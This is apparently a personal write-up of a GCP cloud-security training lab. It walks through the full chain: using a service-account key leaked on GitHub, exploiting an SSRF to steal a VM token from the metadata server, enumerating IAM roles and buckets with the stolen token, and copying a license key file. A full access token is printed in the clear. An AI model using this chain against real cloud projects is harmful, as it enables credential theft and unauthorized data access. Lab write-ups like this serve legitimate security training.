
### Lab Resolution

###### GCP

1) Github Search

Google will through another metatech repo: https://github.com/MetaTech-dev but thats not the repo, nothing in it ties it to CWL or exposed keys.

In github search, do: 
`org:cwl-metatech`

It will find this org: https://github.com/cwl-metatech
It has this repo: https://github.com/cwl-metatech/production-data
Download key: dev-service-account-key.json

2) With the auth file, I attempt to activate the account:
`gcloud auth activate-service-account --key-file dev-service-account-key.json`

3) Enumeration:

==service account:==
dev-service-account@alert-nimbus-335411.iam.gserviceaccount.com
I get the project ID from credentials.db in `/home/user/.config/gcloud/credentials.db`
Project ID: `alert-nimbus-335411` You can also see it in the json key file

org: cant see anything at org level
projects: cant see other projects, just current alert-nimbus
id: dev-service-account@alert-nimbus-335411.iam.gserviceaccount.com  -> $gcloud config list
The account seems to be a google service default account

iam policy: no permission to check project policies
keys: no permission
custom roles on project: no permission

resources:  found a compute instance
`stag-instance  us-central1-b  n1-standard-1               10.10.1.2    34.28.59.217  RUNNING`

To check its associated email:
`gcloud compute instances describe INSTANCE_NAME --zone=ZONE --format="get(serviceAccounts)"
`
Email: vm-service-account@alert-nimbus-335411.iam.gserviceaccount.com

I start enumerating the instance, there is an SSRF vuln in the organization name input. We collect information about the account we just discovered:

curl -H "Metadata-Flavor: Google"
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/vm-service-account@alert-nimbus-335411.iam.gserviceaccount.com/token

We obtain a token:

```
{"access_token":"ya29.c.c0ASRK0GZbC47YD6SkLAHktOU9N2bLyl1m69r0bsjP-j_M4qEoOPv6YgiQwKU-FBxYScTefk_PgkitU5DrgxRmEmIYLCj4jU-rCZLEI3WkhmUHkvlNa1ulLvGwZIM4gWZwyFSSE59L3bSGiUxCyYXEIjcodLIeEHd3Ek0Qo3hXSTjguhGAVEZvmakmU1Xb81swIXJHCDsD6-ndOcFE7YBqIp6aufwMw6rrhDGsXMyQZdp9VE-FWRu0mztT0jcOgtHZCAPnzihd6lOrSxqlvPXgNuZd3mLe_bHI8wGkWJZtsBdKF3N0USY-2VZxhMzYDhAVpdea2wianuFn-1DCap35rRH4XzPvNIclAr5Xu6TaJVo9ymeG1UGzb8CDtgl4SQE391DUXOan13QMY_xJOzk48ncFW9RhkewFIbBiu-0YBml1rofOjQvXfWarbsxgqWg1Wflqze39BRQu004kQlFw-S7Q1UdjOrgS-2ex4jVVyr5q-3uoJ16l2MOYtWRYXIUgafbVhliOlz2I-SZ537evmORfXYaiq3xIJk4qcjvBZroM4qru1ct2no792kdirinVnqQobWe1SVOxwmwBQM_FwtJ7fcgOrRrlw3dru5bbViqsc8FrtbZMfwmbxRj95Mz6R75lkJm-gXn9jp-wQehg_6538d-e-3xIMdsY7_sb5ci3OlQatSwbZY7h3Fbkc3iScQyFufdgVB6ehUIm9BpRuVZnjdOQbWy3a19rXxb4g4in7gaZX26Wguw01Qsb_R4mgBn0VMy070eVzWjhiB61suz1-1MZj2igqJue4sg4h-X-WvUvIxY2BJXOurmc9FkB9wyeaOmmeBRFrlRf91sFhJFMWrQX-Jr5powr2noVf2vWad3c04Rl8g_-0dtflnZonSZQJaauB2g4lqeQZwxi9gXB2ixwcz98eim2Ih-vS5gzlp4fVF1Jhepbw-vSW6w8Of_aMyQz9vXYvX8Vxb9-xedxgYxJx6SeFJZh63uVyO4yZw0qcQ7a1Vk","expires_in":3468,"token_type":"Bearer"}
```

I save the token in a .txt file, I can use it to enumerate the access the vm-service newly discovered account has on the project.

==.........................................................................==

==service account: vm-service-account@alert-nimbus-335411.iam.gserviceaccount.com == 

I see other service accounts associated in the project:`gcloud iam service-accounts list --access-token-file token.txt

This service account with the stolen token has more visibility into the project. Lets check its role:
`gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:vm-service-account@alert-nimbus-335411.iam.gserviceaccount.com" --format="value(bindings.role)" --access-token-file token.txt`

The role is: reader

I check all the custom roles:
`gcloud iam roles list --project alert-nimbus-335411 --access-token-file token.txt`
I see the VM Reader - name VMReadjw1
I check its description:
`gcloud iam roles describe VMReadjw1 --project alert-nimbus-335411 --access-token-file token.txt`
It does not show us the service accounts associated with the role, so I pull all the descriptions of the service accounts and search:

`gcloud projects get-iam-policy alert-nimbus-335411 --format="json" --access-token-file token.txt > roles.txt`

We now want to see what access dev service account has at compute instance level, all we need is to check the role again:
`gcloud iam roles describe VMReadjw1 --project alert-nimbus-335411 --access-token-file token.txt`
The title is VM reader, the service account has 'reader' access.

Now we can enumerate the storage accounts:
`gcloud storage ls --access-token-file token.txt`

```
gs://gcf-sources-233003792018-us-central1/
gs://stag-storage-metatech/
gs://testingcwl/
gs://us.artifacts.alert-nimbus-335411.appspot.com/
```

Lets check access into each one:
`gcloud storage ls [storage account name] --access-token-file token.txt`
We can access several, for this course we wanted:
`stag-storage-metatech`

I obtain the license key:
`gcloud storage cp gs://stag-storage-metatech/license-key.txt . --access-token-file token.txt`



==.........................................................................==


